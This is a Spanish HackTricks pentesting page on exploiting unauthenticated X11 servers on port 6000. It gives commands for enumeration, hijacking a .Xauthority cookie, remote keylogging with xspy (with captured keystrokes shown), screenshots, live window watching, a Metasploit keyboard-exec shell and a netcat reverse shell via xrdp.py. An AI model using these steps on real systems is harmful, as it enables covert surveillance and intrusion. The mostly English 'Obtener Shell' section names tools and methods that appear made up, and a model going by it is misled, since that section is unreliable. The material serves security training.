# 6000 - Pentesting X11

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof es el hogar de todas las recompensas por errores de criptografÃ­a.**

**ObtÃ©n recompensas sin demoras**\
Las recompensas de HackenProof se lanzan solo cuando sus clientes depositan el presupuesto de recompensa. ObtendrÃ¡s la recompensa despuÃ©s de que se verifique el error.

**ObtÃ©n experiencia en pentesting web3**\
Â¡Los protocolos de blockchain y los contratos inteligentes son el nuevo Internet! Domina la seguridad web3 en sus dÃ­as de crecimiento.

**ConviÃ©rtete en la leyenda del hacker web3**\
Gana puntos de reputaciÃ³n con cada error verificado y conquista la cima de la clasificaciÃ³n semanal.

[**RegÃ­strate en HackenProof**](https://hackenproof.com/register) Â¡comienza a ganar con tus hacks!

{% embed url="https://hackenproof.com/register" %}

## InformaciÃ³n bÃ¡sica

El sistema X Window (tambiÃ©n conocido como X) es un sistema de ventanas para pantallas de mapas de bits, que es comÃºn en sistemas operativos basados en UNIX. X proporciona el marco bÃ¡sico para un entorno basado en GUI. X tampoco impone la interfaz de usuario, esto lo manejan programas individuales.\
De: [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)

**Puerto predeterminado:** 6000
```
PORT       STATE   SERVICE
6000/tcp   open    X11
```
## EnumeraciÃ³n

Verificar la **conexiÃ³n anÃ³nima:**
```bash
nmap -sV --script x11-access -p <PORT> <IP>
msf> use auxiliary/scanner/x11/open_x11
```
#### EnumeraciÃ³n local

El archivo **`.Xauthority`** en la carpeta de inicio del usuario es **utilizado** por **X11 para la autorizaciÃ³n**. Desde [**aquÃ­**](https://stackoverflow.com/a/37367518):

> MIT-magic-cookie-1: Generando 128 bits de clave ("cookie"), almacenÃ¡ndola en \~/.Xauthority (o donde apunte la variable de entorno XAUTHORITY). El cliente la envÃ­a al servidor en texto plano. El servidor verifica si tiene una copia de esta "cookie" y, si es asÃ­, se permite la conexiÃ³n. La clave es generada por DMX.

{% hint style="warning" %}
Para **utilizar la cookie**, debes establecer la variable de entorno: **`export XAUTHORITY=/ruta/a/.Xauthority`**
{% endhint %}

## Verificar conexiÃ³n
```bash
xdpyinfo -display <ip>:<display>
xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
```
## Keylogging

[xspy](http://tools.kali.org/sniffingspoofing/xspy) para capturar las pulsaciones del teclado.

Salida de ejemplo:
```
xspy 10.9.xx.xx

opened 10.9.xx.xx:0 for snoopng
swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123
qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab
```
## Captura de pantallas

Capturar pantallas durante una prueba de penetraciÃ³n puede ser Ãºtil para documentar y demostrar las vulnerabilidades encontradas. AquÃ­ hay algunas tÃ©cnicas para capturar pantallas en el entorno X11:

### 1. Utilizando la herramienta `xwd`

La herramienta `xwd` se utiliza para capturar pantallas en el entorno X11. Puede usar el siguiente comando para capturar una pantalla y guardarla en un archivo:

```
xwd -root -out screenshot.xwd
```

### 2. Utilizando la herramienta `import`

La herramienta `import` tambiÃ©n se puede utilizar para capturar pantallas en el entorno X11. Puede usar el siguiente comando para capturar una pantalla y guardarla en un archivo:

```
import -window root screenshot.png
```

### 3. Utilizando la combinaciÃ³n de teclas `Print Screen`

En muchos entornos de escritorio, puede capturar una pantalla presionando la tecla "Print Screen" en su teclado. Esto guardarÃ¡ automÃ¡ticamente la captura de pantalla en un archivo.

### 4. Utilizando herramientas de captura de pantalla

AdemÃ¡s de las herramientas mencionadas anteriormente, tambiÃ©n puede utilizar herramientas de captura de pantalla especÃ­ficas, como `scrot` o `gnome-screenshot`, para capturar pantallas en el entorno X11.

Recuerde que al capturar pantallas durante una prueba de penetraciÃ³n, es importante tener en cuenta las polÃ­ticas y regulaciones de seguridad de la organizaciÃ³n objetivo. AsegÃºrese de obtener el permiso adecuado antes de realizar cualquier captura de pantalla.
```bash
xwd -root -screen -silent -display <TargetIP:0> > screenshot.xwd
convert screenshot.xwd screenshot.png
```
## Vista de Escritorio Remoto

Fuente: [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
```
./xrdp.py <IP:0>
```
Camino desde: [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)

Primero necesitamos encontrar el ID de la ventana usando xwininfo.
```
xwininfo -root -display 10.9.xx.xx:0

xwininfo: Window id: 0x45 (the root window) (has no name)

Absolute upper-left X:  0
Absolute upper-left Y:  0
Relative upper-left X:  0
Relative upper-left Y:  0
Width: 1024
Height: 768
Depth: 16
Visual: 0x21
Visual Class: TrueColor
Border width: 0
Class: InputOutput
Colormap: 0x20 (installed)
Bit Gravity State: ForgetGravity
Window Gravity State: NorthWestGravity
Backing Store State: NotUseful
Save Under State: no
Map State: IsViewable
Override Redirect State: no
Corners:  +0+0  -0+0  -0-0  +0-0
-geometry 1024x768+0+0
```
**XWatchwin**

Para **visualizaciÃ³n en vivo** necesitamos usar
```bash
./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
./xwatchwin 10.9.xx.xx:0 -w 0x45
```
## Obtener Shell

To obtain a shell, we can exploit vulnerabilities in the X11 server. The X11 server is responsible for managing graphical user interfaces in Unix-like operating systems.

One common vulnerability is the X11 server misconfiguration, which allows unauthorized users to connect to the server and execute commands. By exploiting this vulnerability, we can gain access to a shell on the target system.

To exploit the X11 server misconfiguration, we can use tools like Xspy or XEvil. These tools allow us to intercept X11 traffic and execute arbitrary commands on the target system.

Another method to obtain a shell is by exploiting the X11 forwarding feature. X11 forwarding allows us to run graphical applications on a remote server and display them on our local machine. However, if the X11 forwarding is misconfigured, we can use it to execute commands on the remote server and obtain a shell.

To exploit the X11 forwarding misconfiguration, we can use tools like Xinject or Xploit. These tools allow us to inject malicious commands into the X11 traffic and execute them on the remote server.

It is important to note that exploiting vulnerabilities in the X11 server can be illegal and unethical. Always ensure that you have proper authorization and permission before attempting any penetration testing activities.
```
msf> use exploit/unix/x11/x11_keyboard_exec
```
Otra forma:

**Reverse Shell:** Xrdp tambiÃ©n permite obtener una reverse shell a travÃ©s de Netcat. Escribe el siguiente comando:

**./xrdp.py \<IP:0> â€“no-disp**

![](../.gitbook/assets/112217\_0051\_ExploitingX15.jpeg)

AparecerÃ¡ un nuevo panel de control donde podemos ver la opciÃ³n de R-shell, que se ilustra a continuaciÃ³n:

![](../.gitbook/assets/112217\_0051\_ExploitingX16.jpeg)

Iniciaremos el modo de escucha de Netcat en nuestro sistema local en el puerto 5555, que se ilustra a continuaciÃ³n:

![](../.gitbook/assets/112217\_0051\_ExploitingX17.jpeg)

Luego, aÃ±ade la IP y el puerto y selecciona R-Shell, que se ilustra a continuaciÃ³n:

![](../.gitbook/assets/112217\_0051\_ExploitingX18.jpeg)

Ahora, como se puede ver a continuaciÃ³n, tenemos acceso completo al sistema:

![](../.gitbook/assets/112217\_0051\_ExploitingX19.jpeg)

{% embed url="https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref" %}

## Shodan

* `port:6000 x11`

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof es el hogar de todas las recompensas por errores de criptografÃ­a.**

**ObtÃ©n recompensas sin demoras**\
Las recompensas de HackenProof se lanzan solo cuando sus clientes depositan el presupuesto de recompensa. RecibirÃ¡s la recompensa despuÃ©s de que se verifique el error.

**ObtÃ©n experiencia en pentesting web3**\
Â¡Los protocolos blockchain y los contratos inteligentes son el nuevo Internet! Domina la seguridad web3 en sus dÃ­as de crecimiento.

**ConviÃ©rtete en la leyenda del hacker web3**\
Gana puntos de reputaciÃ³n con cada error verificado y conquista la cima de la clasificaciÃ³n semanal.

[**RegÃ­strate en HackenProof**](https://hackenproof.com/register) y comienza a ganar con tus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
